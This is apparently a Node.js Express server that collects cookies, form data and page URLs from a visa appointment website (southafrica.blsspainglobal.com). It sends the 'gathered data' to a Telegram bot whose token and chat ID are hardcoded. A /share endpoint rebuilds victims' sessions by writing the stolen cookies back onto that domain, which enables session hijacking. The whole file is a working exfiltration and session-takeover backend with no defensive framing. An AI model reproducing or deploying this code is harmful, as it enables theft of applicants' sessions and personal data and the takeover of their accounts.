const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid'); // For generating unique tokens

const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for specific origin
app.use(cors({
    origin: 'https://southafrica.blsspainglobal.com', // Allow requests from this origin
    methods: ['GET', 'POST'], // Allow only GET and POST requests
    credentials: true, // Allow cookies and credentials
}));

// Middleware to parse URL-encoded and JSON data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Telegram Configuration
const botToken = process.env.BOT_TOKEN || '7462569364:AAFopBu0YGk8EMPhxDDGrkiNhkqEC8F0XDM'; // Replace with your bot token
const chatId = process.env.CHAT_ID || '-1002406480101'; // Replace with your chat ID

// Function to send a message to Telegram
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const params = new URLSearchParams({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown', // Optional: Use Markdown formatting
    });

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: params,
        });

        const data = await response.json();
        console.log('Telegram API Response:', data); // Log the response

        if (!data.ok) {
            console.error('Failed to send Telegram message:', data);
        }
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
}

// Store session data in memory (replace with a database in production)
const sessions = {};

// Endpoint to generate a shareable token
app.post('/generate-token', (req, res) => {
    const sessionData = {
        url: req.body.url, // URL of the current page
        cookies: req.body.cookies || '', // Cookies from the target website
        formData: req.body.formData || {}, // Form data (if any)
        timestamp: new Date().toISOString(), // Timestamp for tracking
    };

    const token = uuidv4(); // Generate a unique token
    sessions[token] = sessionData; // Store session data

    const shareableLink = `https://test-em43.onrender.com/share?token=${token}`; // Shareable link
    res.status(200).json({ token, shareableLink });
});

// Endpoint to retrieve session data and automate the session
app.get('/share', (req, res) => {
    const token = req.query.token;
    const sessionData = sessions[token];

    if (sessionData) {
        // Return an HTML page with JavaScript to restore the session
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Continue Session</title>
                <script>
                    // Restore cookies
                    const cookies = ${JSON.stringify(sessionData.cookies)};
                    console.log('Cookies to restore:', cookies);
                    cookies.split(';').forEach(cookie => {
                        const [name, value] = cookie.trim().split('=');
                        document.cookie = \`\${name}=\${value}; path=/; domain=southafrica.blsspainglobal.com; SameSite=None; Secure\`;
                    });

                    // Restore form data
                    const formData = ${JSON.stringify(sessionData.formData)};
                    console.log('Form data to restore:', formData);
                    Object.keys(formData).forEach(name => {
                        const element = document.querySelector(\`[name="\${name}"]\`);
                        if (element) {
                            element.value = formData[name];
                        }
                    });

                    // Redirect to the original URL
                    console.log('Redirecting to:', ${JSON.stringify(sessionData.url)});
                    setTimeout(() => {
                        window.location.href = ${JSON.stringify(sessionData.url)};
                    }, 3000); // 3-second delay
                </script>
            </head>
            <body>
                <p>Redirecting to continue your session...</p>
            </body>
            </html>
        `);
    } else {
        res.status(404).send('Invalid or expired token');
    }
});

// Endpoint to handle incoming data (for Telegram notifications)
app.post('/submit-data', (req, res) => {
    try {
        const gatheredData = req.body; // Data gathered by the client
        console.log('Data received from client:', gatheredData);

        // Process the gathered data (e.g., save to database, send notifications)
        sendTelegramMessage(`New data received: ${JSON.stringify(gatheredData)}`);

        res.status(200).send('Data received successfully');
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
